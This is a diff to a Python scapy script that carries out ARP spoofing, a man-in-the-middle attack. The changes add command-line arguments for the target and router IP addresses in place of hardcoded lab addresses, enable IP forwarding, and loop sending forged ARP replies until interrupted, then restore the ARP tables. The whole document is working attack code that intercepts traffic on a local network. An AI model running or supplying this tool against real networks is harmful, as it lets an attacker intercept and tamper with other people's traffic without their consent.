@@ -3,8 +3,24 @@ import scapy.all as scapy
 import time
 import subprocess
 
+# Returns: Target ip and Gateway (router) IP
 def get_user_input() -> tuple[str, str]:
-    pass
+    parse_input = optparse.OptionParser()
+    parse_input.add_option("-t", "--target", dest="target_ip", help="Target device IP")
+    parse_input.add_option("-r", "--router", dest="router_ip", help="The router IP")
+
+    user_options = parse_input.parse_args()[0]
+    target_ip = user_options.target_ip
+    router_ip = user_options.router_ip
+
+    if not target_ip:
+        print("Enter Target IP Address.")
+        raise SystemExit
+    elif not router_ip:
+        print("Enter Router IP Address.")
+        raise SystemExit
+
+    return (target_ip, router_ip)
 
 def get_mac(ip: str) -> str:
     arp_request_packet = scapy.ARP(pdst=ip)
@@ -19,8 +35,6 @@ def get_mac(ip: str) -> str:
 def send_arp_spoofing(target_ip: str, router_ip: str, set_source_as_target : bool = False):
     router_mac = get_mac(router_ip)
     target_mac = get_mac(target_ip)
-
-    arp_packet = scapy.ARP()
 
     if set_source_as_target:
         arp_packet = scapy.ARP(pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac, op=2)
@@ -65,22 +79,25 @@ def set_ip_forwarding(open_ip_forwarding: bool):
             time.sleep(0.5)
             set_ip_forwarding(open_ip_forwarding)
 
+target_ip = get_user_input()[0]
+router_ip = get_user_input()[1]
+
 set_ip_forwarding(True)
 
-print("\nStarting MITM Attack!\n")
+print("\nStarting ARP Spoofing!\n")
 
 sent_packets = 0
 
 try:
     while True:
-        send_arp_spoofing("10.0.2.15", "10.0.2.1")
+        send_arp_spoofing(target_ip, router_ip)
         sent_packets += 1
-        print(f"Sent {sent_packets} Packet...")
+        print(f"\rSent {sent_packets} Packet{"s" if sent_packets > 1 else ""}...", end="")
         time.sleep(3)
 except KeyboardInterrupt:
     print("\nQuiting...\n")
     print("\nResetting ARP Spoofing...\n")
-    reset_arp_spoofing("10.0.2.15", "10.0.2.1")
+    reset_arp_spoofing(target_ip, router_ip)
 
     time.sleep(0.5)
 
